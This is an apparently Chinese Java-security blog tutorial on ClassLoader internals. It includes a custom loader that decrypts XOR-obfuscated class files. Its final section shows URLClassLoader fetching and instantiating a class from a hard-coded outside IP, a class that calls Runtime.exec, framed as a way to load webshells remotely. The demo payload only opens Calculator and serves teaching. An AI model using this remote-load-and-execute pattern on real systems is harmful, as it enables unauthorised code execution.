# [Java安全]类加载器ClassLoader


 # 前言
借用了先知社区的[文章](https://xz.aliyun.com/t/9002#toc-10)的一张图来解释这个原理

![在这里插入图片描述](https://img-blog.csdnimg.cn/8472cb0f79c344fa928c19cda9a202fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)

负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。


# 类加载器介绍
类加载器大致分为两类：
- JVM 默认类加载器
- 用户自定义类加载器

## 类加载器分类
- 引导类加载器(BootstrapClassLoader)：属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中、
- 扩展类加载器(ExtensionsClassLoader)：sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库
- 系统类加载器(AppClassLoader)：由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它
- 自定义类加载器(UserDefineClassLoader)：这个就是由用户自定义的类加载器

## ClassLoader类核心方法
除了上述引导类加载器BootstrapClassLoader，其他类加载器都是继承了CLassLoader类
ClassLoader类是一个抽象类，主要的功能是通过指定的类的名称，找到对应的字节码，返回一java.lang.Class类的实例。
#### loadClass：加载指定的java类
加载名称为name的类，返回的结果是java.lang.Class类的实例

可以看loadClass的源码
```java
    protected Class<?> loadClass(String name, boolean resolve)
        throws ClassNotFoundException
    {
        synchronized (getClassLoadingLock(name)) {
            // First, check if the class has already been loaded
            Class<?> c = findLoadedClass(name);
            if (c == null) {
                long t0 = System.nanoTime();
                try {
                    if (parent != null) {
                        c = parent.loadClass(name, false);
                    } else {
                        c = findBootstrapClassOrNull(name);
                    }
                } catch (ClassNotFoundException e) {
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                }

                if (c == null) {
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    long t1 = System.nanoTime();
                    c = findClass(name);

                    // this is the defining class loader; record the stats
                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                    sun.misc.PerfCounter.getFindClasses().increment();
                }
            }
            if (resolve) {
                resolveClass(c);
            }
            return c;
        }
    }
```
先进行findLoadedClass进行判断是否加载过这个类，如果已经加载过的话，就直接返回；如果没加载过，则使用加载器的父类的加载器去加载。当没有父类的时候，则会调用自身的findClass方法，因此可以重写findClass方法完成一些类加载的特殊要求

#### findCLass：查找指定的Java类

```java
protected Class<?> findClass(String name) throws ClassNotFoundException {
        throw new ClassNotFoundException(name);
    }
```
#### findLoadedClass：查找JVM已经加载过的类

```java
protected final Class<?> findLoadedClass(String name) {
        if (!checkName(name))
            return null;
        return findLoadedClass0(name);
    }
```
#### defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用

```java
protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
```
#### resolveClass：链接指定Java类

```java
protected final void resolveClass(Class<?> c) {
        resolveClass0(c);
    }

    private native void resolveClass0(Class c);
```
## 自定义的类加载器
那么我们如果要自定义类加载器，那么就要进行如下步骤：
1. 继承ClassLoader类
2. 重载fandClass方法
3. 利用defineClass方法将字节码转换成java.lang.class类对象

![在这里插入图片描述](https://img-blog.csdnimg.cn/0d89669d138545389ffb221ede636289.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d67156a6bb94cc4a71af4bd7772a616.png)

代码示例
messageTest
```
public class messageTest {
    public static void main(String[] args){
        System.out.println("This is the secret!");
    }
}

```
对class文件加密的类
encodeTest
```java
import java.io.*;

public class encodeTest {
    public static void main(String[] args) throws IOException {
        encode(
              new File("../out/production/Classloader/messageTest.class"),
              new File("../out/production/Classloader/test/messageTest.class")
        );
    }
    public static void encode(File src, File out) throws IOException {
        FileInputStream fin;
        FileOutputStream fout;

        fin = new FileInputStream(src);
        fout = new FileOutputStream(out);

        int temp = -1;
        while ((temp = fin.read()) != -1) {// 读取一个字节
            fout.write(temp ^ 0xff);// 取反输出
        }
        fin.close();
        fout.close();
    }
}
```
再写解密类，重写findclass方法

```java
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class decodeTest extends ClassLoader{
    private String rootDir;

    public decodeTest(String rootDir) {
        this.rootDir = rootDir;
    }
    
    // 解密文件
    public byte[] getClassData(String className) throws IOException {
        String path = rootDir + "/" + className.replace('.', '/') + ".class";
        // 将流中的数据转换为字节数组
        InputStream is = null;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        is = new FileInputStream(path);
        byte[] buffer = new byte[1024];
        int temp = -1;
        while ((temp = is.read()) != -1) {
            baos.write(temp ^ 0xff);
        }
        return baos.toByteArray();
    }

    @Override // 重写覆盖findClass
    protected Class<?> findClass(String className) throws ClassNotFoundException {
        Class<?> c = findLoadedClass(className);
        if (c != null) {
            return c;
        } else {
            ClassLoader parent = this.getParent();

            c = parent.loadClass(className);
            if (c != null) {
                System.out.println("父类成功加载");
                return c;
            } else {// 读取文件 转化成字节数组
                byte[] classData = new byte[0];
                try {
                    classData = getClassData(className);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                if (classData == null) {
                    throw new ClassNotFoundException();
                } else { // 调用defineClass()方法
                    c = defineClass(className, classData, 0, classData.length);
                    return c;
                }
            }
        }
    }
}
```
再写测试类

```java
public class loadClassTest {
    public static void main(String[] args) throws ClassNotFoundException {
        decodeTest de = new decodeTest("/Users/liucheng/Desktop/JavaSec/out/production/Classloader/test/");
        Class<?> a = de.loadClass("messageTest");
        System.out.println(a);

    }

}

```
由于我指定的class文件是加密后的class文件，所以java自带的类加载器就加载不了，这里我们成功用自定义的类加载器去解密加载到了messageTest

![在这里插入图片描述](https://img-blog.csdnimg.cn/1de1b7f2ad884842854bd8170a710fd0.png)

## URLClassLoader
URLClassLoader是ClassLoader的一个实现，拥有远程服务器上加载类的能力，通过这个URLClassLoader可以实现对一些webshell的远程加载

这里举个例子
我在Tomcat服务器处生成一个执行系统命令的class

```java
public class Test {
    public static void main(String[] args){
        try{
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } 
        catch(Exception e) {
            e.printStackTrace();
        }
    }

}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b3a2cadf22264a219bb5d31b88ba296e.png)

然后在项目里远程加载这个类

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLClassLoaderTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        URL url = new URL("http://101.35.98.118:12424/javatest/");
        URLClassLoader cl = new URLClassLoader(new URL[]{url});
        Class c = cl.loadClass("Test");
        c.newInstance();
    }
}

```







